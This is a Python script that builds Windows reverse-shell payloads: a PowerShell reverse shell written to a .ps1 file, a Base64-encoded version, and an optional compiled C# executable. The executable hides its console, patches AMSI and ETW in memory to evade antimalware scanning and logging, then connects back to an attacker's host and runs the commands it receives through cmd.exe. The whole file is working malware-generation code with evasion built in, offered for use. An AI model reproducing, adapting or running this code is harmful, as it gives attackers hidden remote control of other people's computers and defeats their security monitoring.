import os
import subprocess
import base64
from datetime import datetime

OUTPUT_DIR = "output"
os.makedirs(OUTPUT_DIR, exist_ok=True)


def generate_powershell_and_exe(lhost, lport, filename):
    """
    Generates:
    1. PowerShell reverse shell script (.ps1)
    2. Base64-encoded version of the script (.b64.txt)
    3. Optional C# EXE payload (hidden CMD, AMSI/ETW bypass)
    """

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_name = filename if filename else f"payload_{timestamp}"

    # --- Step 1: Create PowerShell reverse shell script ---
    ps_script = f"""
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close();
"""

    ps_path = os.path.join(OUTPUT_DIR, f"{base_name}.ps1")
    with open(ps_path, "w") as f:
        f.write(ps_script)

    print(f"[+] PowerShell loader created: {ps_path}")

    # --- Step 2: Create Base64 encoded version ---
    encoded = base64.b64encode(ps_script.encode("utf-16le")).decode("utf-8")
    b64_path = os.path.join(OUTPUT_DIR, f"{base_name}.b64.txt")
    with open(b64_path, "w") as f:
        f.write(encoded)

    print(f"[+] Base64 PowerShell payload created: {b64_path}")

    # --- Step 3: Ask if user wants EXE ---
    create_exe = input("[?] Do you want to also create a C# EXE payload? (y/n): ").strip().lower()
    if create_exe != "y":
        return ps_path  # Only PS1 + Base64 created

    # --- Step 4: Generate C# EXE with hidden CMD ---
    cs_code = f"""
using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpShell
{{
    class Program
    {{
        [DllImport("kernel32")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_HIDE = 0;

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void BypassAMSI()
        {{
            try {{
                IntPtr hModule = LoadLibrary("amsi.dll");
                IntPtr addr = GetProcAddress(hModule, "AmsiScanBuffer");
                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)0x0010, 0x40, out oldProtect);
                Marshal.Copy(new byte[] {{ 0x31, 0xC0, 0xC3 }}, 0, addr, 3);
            }} catch {{ }}
        }}

        static void BypassETW()
        {{
            try {{
                IntPtr hModule = LoadLibrary("ntdll.dll");
                IntPtr addr = GetProcAddress(hModule, "EtwEventWrite");
                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)0x0010, 0x40, out oldProtect);
                Marshal.Copy(new byte[] {{ 0xC3 }}, 0, addr, 1);
            }} catch {{ }}
        }}

        static void Main(string[] args)
        {{
            // 🔹 Hide console window immediately
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_HIDE);

            BypassAMSI();
            BypassETW();

            string attackerIP = "{lhost}";
            int attackerPort = {lport};

            try
            {{
                using (TcpClient client = new TcpClient(attackerIP, attackerPort))
                using (NetworkStream stream = client.GetStream())
                {{
                    byte[] buffer = new byte[1024];
                    int bytesRead;

                    while (true)
                    {{
                        bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead <= 0) break;

                        string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        string output = RunCommand(command);

                        byte[] outBytes = Encoding.ASCII.GetBytes(output + "\\nPS> ");
                        stream.Write(outBytes, 0, outBytes.Length);
                        stream.Flush();
                    }}
                }}
            }}
            catch {{ }}
        }}

        static string RunCommand(string command)
        {{
            StringBuilder result = new StringBuilder();
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {{
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }};
                using (Process proc = Process.Start(psi))
                {{
                    result.Append(proc.StandardOutput.ReadToEnd());
                    result.Append(proc.StandardError.ReadToEnd());
                }}
            }}
            catch (Exception ex)
            {{
                result.Append("[!] Exception: " + ex.Message);
            }}
            return result.ToString();
        }}
    }}
}}
"""

    cs_path = os.path.join(OUTPUT_DIR, f"{base_name}.cs")
    with open(cs_path, "w") as f:
        f.write(cs_code)

    exe_path = os.path.join(OUTPUT_DIR, f"{base_name}.exe")
    try:
        subprocess.run(["mcs", "-out:" + exe_path, cs_path], check=True)
        print(f"[+] EXE payload generated: {exe_path}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to compile EXE: {e}")
        return ps_path

    return exe_path
